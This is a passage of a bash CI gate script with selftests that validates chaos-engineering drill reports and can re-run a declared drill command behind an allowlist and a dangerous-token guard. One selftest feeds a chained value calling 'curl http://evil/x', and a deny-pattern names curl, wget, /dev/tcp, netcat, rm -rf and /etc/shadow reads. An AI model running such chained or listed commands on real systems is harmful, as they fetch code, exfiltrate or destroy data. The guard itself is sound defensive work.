  ck "EXEC + non-allowlisted runner (helm) -> FAIL" 2 "$?"
  rm -rf "$tmp"

  # E6. EXEC + dangerous token chained after a real drill -> FAIL (refused, never run)
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/chaos-resilience-selftest.XXXXXX")" || return 1
  make_surface "$tmp"; make_evidence "$tmp"; make_good_proof "$tmp"; write_fake_drill "$tmp" 0 true
  set_chaos_probe "$tmp" "bash ops/chaos.sh; curl http://evil/x" report
  WALTEUR_CHAOS_EXEC=1 WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "EXEC + dangerous token (curl) -> FAIL" 2 "$?"
  rm -rf "$tmp"

  # E7. EXEC mode + NO chaos_probe.command declared -> FAIL (shape-only rejected when armed)
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/chaos-resilience-selftest.XXXXXX")" || return 1
  make_surface "$tmp"; make_evidence "$tmp"; make_good_proof "$tmp"
  WALTEUR_CHAOS_EXEC=1 WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "EXEC mode + no chaos_probe.command -> FAIL" 2 "$?"
  rm -rf "$tmp"

  # E8. BACK-COMPAT: WALTEUR_CHAOS_EXEC explicitly 0 + a chaos_probe.command present -> existing shape-read
  #     PASS (drill is NOT executed). NOTE (S033): make_surface is risk_tier:high, which now auto-arms EXEC
  #     by DEFAULT when the flag is unset — so "back-compat unchanged" now means an EXPLICIT EXEC=0 opt-out,
  #     not merely an unset flag. The unset-flag-on-high-tier case is covered separately below (case a).
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/chaos-resilience-selftest.XXXXXX")" || return 1
  make_surface "$tmp"; make_evidence "$tmp"; make_good_proof "$tmp"; write_fake_drill "$tmp" 1 true
  set_chaos_probe "$tmp" "bash ops/chaos.sh" report
  WALTEUR_CHAOS_EXEC=0 WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "explicit EXEC=0 + chaos_probe present -> shape-read PASS (drill NOT run)" 0 "$?"
  jq -e '(.chaos_probe_executed // false) == false' "$tmp/walteur-kit/chaos-resilience-report.json" >/dev/null 2>&1
  ck "explicit EXEC=0 shape-read does NOT set chaos_probe_executed" 0 "$?"
  rm -rf "$tmp"

  # 13. bypass -> SKIP exit 0
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/chaos-resilience-selftest.XXXXXX")" || return 1
  make_surface "$tmp"
  WALTEUR_CHAOS=off WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "bypass WALTEUR_CHAOS=off -> SKIP exit 0" 0 "$?"
  rm -rf "$tmp"

  # 14. PAUSED -> exit 2
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/chaos-resilience-selftest.XXXXXX")" || return 1
  make_surface "$tmp"
  : > "$tmp/walteur-kit/PAUSED"
  WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "PAUSED -> exit 2" 2 "$?"
  rm -rf "$tmp"

  # ── EXEC-default risk-tier-awareness (S033 enforcement; chaos is the DELIBERATE EXCEPTION — auto-arm
  #    keys off risk_tier high|regulated, NOT build_class, per S021's over-aggressive-drill tradeoff) ──
  # (a) risk_tier:high contract + no env override -> EXEC path ARMED (drill genuinely re-run, marker set)
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/chaos-resilience-selftest.XXXXXX")" || return 1
  make_surface "$tmp"; make_evidence "$tmp"; make_good_proof "$tmp"; write_fake_drill "$tmp" 0 true
  set_chaos_probe "$tmp" "bash ops/chaos.sh" report
  WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "risk_tier:high + no env -> EXEC armed by default (exit)" 0 "$?"
  jq -e '.chaos_probe_executed == true and .observed_exit == 0' "$tmp/walteur-kit/chaos-resilience-report.json" >/dev/null 2>&1
  ck "risk_tier:high + no env -> report shows genuine drill re-run" 0 "$?"
  rm -rf "$tmp"

  # (b) explicit WALTEUR_CHAOS_EXEC=0 override respected even on a risk_tier:high contract
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/chaos-resilience-selftest.XXXXXX")" || return 1
  make_surface "$tmp"; make_evidence "$tmp"; make_good_proof "$tmp"
  set_chaos_probe "$tmp" "bash ops/chaos.sh" report
  WALTEUR_CHAOS_EXEC=0 WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "risk_tier:high + explicit EXEC=0 -> override respected (exit)" 0 "$?"
  jq -e '(.chaos_probe_executed // false) == false' "$tmp/walteur-kit/chaos-resilience-report.json" >/dev/null 2>&1
  ck "explicit EXEC=0 override -> report shows shape-read only (no genuine re-run)" 0 "$?"
  rm -rf "$tmp"

  # (c) risk_tier:medium (below the chaos auto-arm bar) -> legacy default (EXEC stays 0) though it IS a
  #     code-class build_class (proves chaos keys off risk_tier, not build_class, unlike the other 4 hooks)
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/chaos-resilience-selftest.XXXXXX")" || return 1
  make_slo_surface "$tmp"; make_evidence "$tmp"; make_good_proof "$tmp"
  set_chaos_probe "$tmp" "bash ops/chaos.sh" report
  WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "risk_tier:medium (SLO surface) + no env -> legacy default (exit)" 0 "$?"
  jq -e '(.chaos_probe_executed // false) == false' "$tmp/walteur-kit/chaos-resilience-report.json" >/dev/null 2>&1
  ck "risk_tier:medium -> report shows shape-read only (below chaos auto-arm bar)" 0 "$?"
  rm -rf "$tmp"

  # (d) no build-contract.json at all -> legacy default (EXEC stays 0)
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/chaos-resilience-selftest.XXXXXX")" || return 1
  mkdir -p "$tmp/walteur-kit"
  printf '{"has_availability_target":true}\n' > "$tmp/walteur-kit/preflight-signals.json"
  make_evidence "$tmp"; make_good_proof "$tmp"
  set_chaos_probe "$tmp" "bash ops/chaos.sh" report
  WALTEUR_ROOT="$tmp" bash "$SELF" >/dev/null 2>&1
  ck "no build-contract.json -> legacy default (exit)" 0 "$?"
  jq -e '(.chaos_probe_executed // false) == false' "$tmp/walteur-kit/chaos-resilience-report.json" >/dev/null 2>&1
  ck "no build-contract.json -> report shows shape-read only (legacy default)" 0 "$?"
  rm -rf "$tmp"

  echo "chaos-resilience-gate selftest: $pass/$((pass+fail)) passed"
  [ "$fail" -eq 0 ]
}

if [ "${1:-}" = "--selftest" ]; then
  selftest
  exit $?
fi

# ── CONTRACT ordering: PAUSED (exit 2) before bypass; bypass before measurement ────────────────────
if [ -f "$KIT/PAUSED" ]; then
  write_report "FAIL" "WALTEUR is paused (walteur-kit/PAUSED present)"
  echo "chaos-resilience-gate: FAIL — walteur-kit/PAUSED present -> $REPORT" >&2
  exit 2
fi

if [ "${WALTEUR_CHAOS:-on}" = "off" ]; then
  write_report "SKIP" "WALTEUR_CHAOS=off"
  echo "chaos-resilience-gate: SKIP — bypassed via WALTEUR_CHAOS=off (recorded, not silent-green) -> $REPORT" >&2
  exit 0
fi

# fail-closed if jq is absent (cannot validate JSON -> loud SKIP, never silent green)
if ! have jq; then
  write_report "SKIP" "jq not installed — cannot validate chaos-report.json"
  echo "chaos-resilience-gate: SKIP — required tool 'jq' not installed (cannot_measure, recorded) -> $REPORT" >&2
  exit 0
fi
if ! have date; then
  write_report "SKIP" "date not installed — cannot compute staleness"
  echo "chaos-resilience-gate: SKIP — required tool 'date' not installed (cannot_measure, recorded) -> $REPORT" >&2
  exit 0
fi

detect_surface
if [ "$SURFACE" -eq 0 ]; then
  write_report "NOT_APPLICABLE" "no resilience surface (not high/regulated risk and no availability/SLO target)"
  echo "chaos-resilience-gate: NOT_APPLICABLE — no resilience surface -> $REPORT" >&2
  exit 0
fi

if [ ! -f "$PROOF" ]; then
  write_report "FAIL" "resilience surface present ($SURFACE_REASON) but walteur-kit/chaos-report.json is absent — run an active game-day drill"
  echo "chaos-resilience-gate: FAIL — surface present ($SURFACE_REASON) but chaos-report.json absent -> $REPORT" >&2
  exit 2
fi

if ! jq empty "$PROOF" >/dev/null 2>&1; then
  write_report "FAIL" "chaos-report.json is not valid JSON"
  echo "chaos-resilience-gate: FAIL — chaos-report.json invalid JSON -> $REPORT" >&2
  exit 2
fi

# ── shape: drills array non-empty, each drill carries all required typed fields ────────────────────
shape_err="$(jq -r '
  def err(c;m): if c then m else empty end;
  [ err((.drills|type)!="array"; "drills must be an array")
  , err(((.drills|type)=="array") and ((.drills|length)<1); "drills must contain at least one drill")
  , err([ .drills[]? | select((.hypothesis|type)!="string" or (.hypothesis|length)<1) ] | length>0; "each drill needs a non-empty hypothesis")
  , err([ .drills[]? | select((.fault_injected|type)!="string" or (.fault_injected|length)<1) ] | length>0; "each drill needs a non-empty fault_injected")
  , err([ .drills[]? | select((.steady_state_metric|type)!="string" or (.steady_state_metric|length)<1) ] | length>0; "each drill needs a non-empty steady_state_metric")
  , err([ .drills[]? | select((.blast_radius_observed|type)!="string" or (.blast_radius_observed|length)<1) ] | length>0; "each drill needs a non-empty blast_radius_observed")
  , err([ .drills[]? | select((.recovered|type)!="boolean") ] | length>0; "each drill needs recovered as a boolean")
  , err([ .drills[]? | select((.recovery_seconds|type)!="number") ] | length>0; "each drill needs recovery_seconds as a number")
  , err([ .drills[]? | select((.ran_ts|type)!="string" or (.ran_ts|length)<1) ] | length>0; "each drill needs a non-empty ran_ts")
  , err([ .drills[]? | select((.evidence_ref|type)!="string") ] | length>0; "each drill needs an evidence_ref string")
  ] | map(select(. != null)) | .[]' "$PROOF" 2>/dev/null)"

if [ -n "$shape_err" ]; then
  echo "chaos-resilience-gate: FAIL — chaos-report.json violates the required shape:" >&2
  printf '%s\n' "$shape_err" | sed 's/^/  - /' >&2
  err_json="$(printf '%s\n' "$shape_err" | jq -R . | jq -s '{findings:.}')"
  write_report "FAIL" "chaos-report.json fails required shape" "$err_json"
  exit 2
fi

# ── freshness: newest drill ran_ts must be within MAX_AGE_DAYS and not in the future ───────────────
today_epoch="$(date_to_epoch "$TODAY")"
newest_epoch=0
newest_ts=""
stale_unparseable=0
while IFS= read -r rt; do
  [ -n "$rt" ] || continue
  e="$(date_to_epoch "$rt")"
  if [ -z "$e" ]; then stale_unparseable=1; continue; fi
  if [ "$e" -gt "$newest_epoch" ]; then newest_epoch="$e"; newest_ts="$rt"; fi
done < <(jq -r '.drills[]?.ran_ts // empty' "$PROOF")

if [ "$newest_epoch" -eq 0 ] || [ -z "$today_epoch" ]; then
  write_report "FAIL" "no parseable drill ran_ts (unparseable=$stale_unparseable)"
  echo "chaos-resilience-gate: FAIL — no parseable drill ran_ts -> $REPORT" >&2
  exit 2
fi
if [ "$newest_epoch" -gt $((today_epoch + 86400)) ]; then
  write_report "FAIL" "newest drill ran_ts is in the future: $newest_ts"
  echo "chaos-resilience-gate: FAIL — newest drill ran_ts in the future ($newest_ts) -> $REPORT" >&2
  exit 2
fi
age_days=$(( (today_epoch - newest_epoch) / 86400 ))
[ "$age_days" -lt 0 ] && age_days=0
if [ "$age_days" -gt "$MAX_AGE_DAYS" ]; then
  details="$(jq -n --arg ts "$newest_ts" --argjson age "$age_days" --argjson max "$MAX_AGE_DAYS" '{newest_ran_ts:$ts, age_days:$age, max_age_days:$max}')"
  write_report "FAIL" "chaos drills are stale (newest ${age_days}d old, max ${MAX_AGE_DAYS}d)" "$details"
  echo "chaos-resilience-gate: FAIL — chaos drills stale (${age_days}d > ${MAX_AGE_DAYS}d) -> $REPORT" >&2
  exit 2
fi

# ── failed-drill governance: every recovered:false drill MUST carry a non-empty signed risk-acceptance ref
unaccepted_failures="$(jq -r '
  [ .drills[]? | select(.recovered == false)
    | select(((.risk_acceptance_ref // "") | type != "string") or ((.risk_acceptance_ref // "") | length < 1)) ]
  | length' "$PROOF" 2>/dev/null)"
if [ "${unaccepted_failures:-0}" -gt 0 ]; then
  write_report "FAIL" "$unaccepted_failures drill(s) recovered:false with no signed risk_acceptance_ref — a failed drill must carry an explicit, signed risk acceptance"
  echo "chaos-resilience-gate: FAIL — $unaccepted_failures un-accepted failed drill(s) -> $REPORT" >&2
  exit 2
fi

# every declared risk_acceptance_ref on a failed drill must point to a non-empty in-tree file
ra_missing=0
while IFS= read -r ref; do
  [ -n "$ref" ] || continue
  if ! safe_ref "$ref"; then
    echo "chaos-resilience-gate: FAIL — missing/unsafe/empty risk_acceptance_ref: $ref" >&2
    ra_missing=$((ra_missing+1))
  fi
done < <(jq -r '.drills[]? | select(.recovered == false) | .risk_acceptance_ref // empty' "$PROOF")
if [ "$ra_missing" -gt 0 ]; then
  write_report "FAIL" "$ra_missing risk_acceptance_ref(s) missing, unsafe, or empty on failed drill(s)"
  exit 2
fi

# ── must have AT LEAST ONE recovered:true drill that is BOTH (a) carrying a NON-EMPTY in-tree
#    evidence_ref AND (b) FRESH on its OWN ran_ts (within MAX_AGE_DAYS, not in the future). ─────────
#    Freshness is judged on the RECOVERY drill's own ran_ts, NOT on the global newest across all
#    drills: otherwise a 400-day-old recovery could be laundered "fresh" by any unrelated fresh
#    sibling drill (e.g. a freshly-dated accepted failure). The global future-date / global-stale
#    rejections above still stand; this is a STRICTER, per-recovery freshness requirement on top.
proven_recovery=0          # recovered:true drills with a safe, non-empty evidence_ref (any age)
fresh_proven_recovery=0    # of those, the ones whose OWN ran_ts is fresh and not in the future
bad_evidence=0
newest_recovered_ts=""
newest_recovered_epoch=0
while IFS=$'\t' read -r rt ref; do
  if safe_ref "$ref"; then
    proven_recovery=$((proven_recovery+1))
    re="$(date_to_epoch "$rt")"
    if [ -n "$re" ] && [ "$re" -le $((today_epoch + 86400)) ]; then
      rage=$(( (today_epoch - re) / 86400 )); [ "$rage" -lt 0 ] && rage=0
      if [ "$rage" -le "$MAX_AGE_DAYS" ]; then
        fresh_proven_recovery=$((fresh_proven_recovery+1))
        if [ "$re" -gt "$newest_recovered_epoch" ]; then newest_recovered_epoch="$re"; newest_recovered_ts="$rt"; fi
      fi
    fi
  else
    echo "chaos-resilience-gate: FAIL — recovered drill evidence_ref missing/unsafe/empty: $ref" >&2
    bad_evidence=$((bad_evidence+1))
  fi
done < <(jq -r '.drills[]? | select(.recovered == true) | [ (.ran_ts // ""), (.evidence_ref // "") ] | @tsv' "$PROOF")

if [ "$bad_evidence" -gt 0 ]; then
  write_report "FAIL" "$bad_evidence recovered drill(s) have a missing, unsafe, or empty evidence_ref"
  exit 2
fi

if [ "$proven_recovery" -lt 1 ]; then
  write_report "FAIL" "no drill with recovered:true and non-empty evidence_ref — an active recovery must be OBSERVED"
  echo "chaos-resilience-gate: FAIL — no proven recovered drill -> $REPORT" >&2
  exit 2
fi

if [ "$fresh_proven_recovery" -lt 1 ]; then
  details="$(jq -n --argjson proven "$proven_recovery" --argjson max "$MAX_AGE_DAYS" '{recovered_with_evidence:$proven, fresh_recovered_with_evidence:0, max_age_days:$max}')"
  write_report "FAIL" "every recovered:true drill with evidence is stale (>${MAX_AGE_DAYS}d) or future-dated — freshness is judged on the recovery drill's own ran_ts, so a stale recovery cannot be laundered fresh by an unrelated fresh drill; re-run a recent game-day drill that recovers" "$details"
  echo "chaos-resilience-gate: FAIL — no FRESH recovered drill with evidence (stale recovery not laundered fresh by a fresh sibling) -> $REPORT" >&2
  exit 2
fi

# ── EXECUTE PATH — RE-RUN a real game-day drill and OBSERVE recovery (not just shape-read) ───────────
#   The shape/freshness checks above prove a RECORD of a recovered drill exists and is fresh. That is a
#   read of evidence the LLM produced earlier. With WALTEUR_CHAOS_EXEC=1 we go further: if the report (or a
#   chaos-plan.json) declares chaos_probe.command (e.g. 'bash ops/chaos.sh'), we RE-RUN that drill HERE and
#   OBSERVE its exit, then re-validate that the report STILL carries a FRESH recovered:true drill — i.e. the
#   drill regenerated its own evidence during THIS run. Same execute-probe idiom as zero-downtime-cutover-
#   gate.sh / authz-tenant-gate.sh: shared no-op guard (probe_proves_something) + allowlisted runner +
#   dangerous-token guard + ( cd "$ROOT" && eval ) + observe exit. Trivial/no-op probes are REJECTED.
#   Without the flag the EXISTING shape-read behavior below is UNCHANGED (back-compat).
if [ "${WALTEUR_CHAOS_EXEC:-0}" = "1" ]; then
  # The probe may live in chaos-report.json or in an optional chaos-plan.json. Prefer the report; fall back
  # to the plan. A null/empty command is treated as "no probe declared".
  chaos_cmd="$(jq -r '.chaos_probe.command // empty' "$PROOF" 2>/dev/null)"
  chaos_src="chaos-report.json"
  if [ -z "$chaos_cmd" ] && [ -f "$PLAN" ] && jq empty "$PLAN" >/dev/null 2>&1; then
    chaos_cmd="$(jq -r '.chaos_probe.command // empty' "$PLAN" 2>/dev/null)"
    chaos_src="chaos-plan.json"
  fi

  if [ -z "$chaos_cmd" ]; then
    write_report "FAIL" "WALTEUR_CHAOS_EXEC=1: no chaos_probe.command declared in chaos-report.json or chaos-plan.json — a shape-read alone cannot OBSERVE recovery; declare the drill command (e.g. 'bash ops/chaos.sh')"
    echo "chaos-resilience-gate: FAIL — EXEC mode requires chaos_probe.command (none declared) -> $REPORT" >&2
    exit 2
  fi

  # FAIL CLOSED: if the shared probe-proof guard file was absent at source time the function is undefined —
  # refuse to run the drill rather than silently skip the unprovable-probe check (matches cutover gate).
  if [ "$PROBE_GUARD" != "1" ] || ! command -v probe_proves_something >/dev/null 2>&1; then
    write_report "FAIL" "shared probe-proof guard (_probe-proof.sh) unavailable — cannot prove chaos_probe.command is a real drill; failing closed in EXEC mode"
    echo "chaos-resilience-gate: FAIL — probe-proof guard unavailable, failing closed (EXEC) -> $REPORT" >&2
    exit 2
  fi

  chaos_trim="$(printf '%s' "$chaos_cmd" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')"

  # AUTHORITATIVE no-op / constant-exit rejection: the probe must invoke a recognized test runner OR name a
  # token that resolves to a REAL on-disk script/file (e.g. ops/chaos.sh). A constant that passes by doing
  # nothing ('bash -c "exit 0"', true, :, node -e 'process.exit(0)') touches nothing real -> rejected.
  if ! probe_proves_something "$chaos_trim"; then
    write_report "FAIL" "chaos_probe.command references no real on-disk drill script/runner — it cannot re-run a real game-day drill (no-op/constant probe rejected)"
    echo "chaos-resilience-gate: FAIL — unprovable/no-op chaos_probe.command -> $REPORT" >&2
    exit 2
  fi
  # Pre-existing bare-constant fast-reject (redundant but explicit backstop for the common literals).
  case "$chaos_trim" in
    true|false|:|/bin/true|/usr/bin/true|/bin/false|/usr/bin/false)
      write_report "FAIL" "chaos_probe.command is a trivial no-op ($chaos_trim) — it must re-run a REAL drill, not a constant that passes by doing nothing"
      echo "chaos-resilience-gate: FAIL — trivial no-op chaos_probe.command ($chaos_trim) -> $REPORT" >&2
      exit 2 ;;
  esac

  # Allowlisted runner guard (same first-token allowlist family as authz-tenant-gate / cutover-gate).
  chaos_first="$(printf '%s' "$chaos_cmd" | awk '{print $1}')"
  case "$chaos_first" in
    npm|pnpm|yarn|npx|node|deno|bun|python|python3|pytest|tox|uv|go|cargo|make|just|task|bash|sh|jest|vitest|mocha|rspec|rake|phpunit|composer|dotnet|mvn|gradle|./gradlew|ctest|cmake) : ;;
    *) write_report "FAIL" "chaos_probe.command runner '$chaos_first' is not an allowlisted runner (injection guard)"
       echo "chaos-resilience-gate: FAIL — non-allowlisted runner '$chaos_first' -> $REPORT" >&2
       exit 2 ;;
  esac

  # Dangerous-token guard (identical token set to the sibling execute-probe gates): refuse anything that
  # could exfil, destroy, escalate, or chain a side command. Never run on a match.
  if printf '%s' "$chaos_cmd" | grep -Eqi 'curl|wget|/dev/tcp|base64|netcat|ncat|rm[[:space:]]+-rf|sudo|mkfs|[[:space:]]dd[[:space:]]|ssh[[:space:]]|scp[[:space:]]|\$\(|`|/etc/(passwd|shadow)'; then
    write_report "FAIL" "chaos_probe.command contains a dangerous token; refusing to run"
    echo "chaos-resilience-gate: FAIL — dangerous token in chaos_probe.command -> $REPORT" >&2
    exit 2
  fi

  # RE-RUN THE DRILL and OBSERVE its exit. The drill is responsible for being self-contained (own ephemeral
  # data file + full process cleanup) and for regenerating chaos-report.json from its OWN observed values.
  echo "chaos-resilience-gate: EXEC — re-running game-day drill via '$chaos_cmd' (from $chaos_src) ..." >&2
  ( cd "$ROOT" && eval "$chaos_cmd" >/dev/null 2>&1 ); chaos_rc=$?

  if [ "$chaos_rc" != "0" ]; then
    details="$(jq -n --arg c "$chaos_cmd" --argjson got "$chaos_rc" '{chaos_probe:$c, observed_exit:$got, expected:0}')"
    write_report "FAIL" "chaos drill EXECUTED and did NOT recover (exit $chaos_rc != 0) — the re-run game-day drill failed" "$details"
    echo "chaos-resilience-gate: FAIL — chaos drill executed, exit $chaos_rc != 0 -> $REPORT" >&2
    exit 2
  fi

  # The drill exited 0 — but exit 0 is NOT enough: require that, AFTER the drill, chaos-report.json STILL
  # parses and STILL carries a FRESH recovered:true drill with non-empty in-tree evidence (the drill
  # regenerated its own evidence during THIS run). This defeats a probe that exits 0 without actually
  # recovering / without refreshing the record.
  if ! jq empty "$PROOF" >/dev/null 2>&1; then
    write_report "FAIL" "chaos drill exited 0 but chaos-report.json is missing/invalid after the run — no regenerated recovery evidence"
    echo "chaos-resilience-gate: FAIL — post-drill chaos-report.json missing/invalid -> $REPORT" >&2
    exit 2
  fi
  post_fresh="$(count_fresh_recovered_drills "$PROOF")"
  if [ "${post_fresh:-0}" -lt 1 ]; then
    details="$(jq -n --argjson got "$chaos_rc" --argjson max "$MAX_AGE_DAYS" '{observed_exit:$got, fresh_recovered_after_drill:0, max_age_days:$max}')"
    write_report "FAIL" "chaos drill exited 0 but chaos-report.json has NO fresh recovered:true drill with evidence after the run — the drill did not regenerate observed recovery" "$details"
    echo "chaos-resilience-gate: FAIL — drill exit 0 but no fresh recovered drill regenerated -> $REPORT" >&2
    exit 2
  fi

  drills_count="$(jq '.drills | length' "$PROOF" 2>/dev/null)"
  newest_recovered_post="$(jq -r '[ .drills[]? | select(.recovered == true) | .ran_ts // empty ] | max // ""' "$PROOF" 2>/dev/null)"
  extra="$(jq -n --argjson drills "${drills_count:-0}" --argjson fresh_recovered "$post_fresh" --arg newest_recovered "$newest_recovered_post" --arg surface "$SURFACE_REASON" --arg c "$chaos_cmd" --arg src "$chaos_src" \
    '{drills:$drills, fresh_recovered_drills_with_evidence:$fresh_recovered, newest_recovered_ran_ts:$newest_recovered, surface:$surface, chaos_drill_observed:true, chaos_probe_executed:true, observed_exit:0, chaos_probe_command:$c, chaos_probe_source:$src}')"
  write_report "PASS" "active chaos drill OBSERVED by re-executing the game-day drill ('$chaos_cmd', exit 0); chaos-report.json regenerated $post_fresh fresh recovered drill(s) with non-empty evidence ($SURFACE_REASON)" "$extra"
  echo "chaos-resilience-gate: PASS — recovery OBSERVED by re-executing '$chaos_cmd' (exit 0); $post_fresh fresh recovered drill(s) regenerated -> $REPORT" >&2
  exit 0
fi

drills_count="$(jq '.drills | length' "$PROOF")"
extra="$(jq -n --argjson drills "$drills_count" --argjson recovered "$proven_recovery" --argjson fresh_recovered "$fresh_proven_recovery" --arg newest "$newest_ts" --arg newest_recovered "$newest_recovered_ts" --arg surface "$SURFACE_REASON" \
  '{drills:$drills, recovered_drills_with_evidence:$recovered, fresh_recovered_drills_with_evidence:$fresh_recovered, newest_ran_ts:$newest, newest_recovered_ran_ts:$newest_recovered, surface:$surface, chaos_drill_observed:true}')"
write_report "PASS" "active chaos drill observed: $fresh_proven_recovery fresh recovered drill(s) with non-empty evidence (newest recovery $newest_recovered_ts, within ${MAX_AGE_DAYS}d) ($SURFACE_REASON)" "$extra"
echo "chaos-resilience-gate: PASS — $fresh_proven_recovery fresh recovered drill(s) with non-empty evidence, newest recovery $newest_recovered_ts -> $REPORT" >&2
exit 0
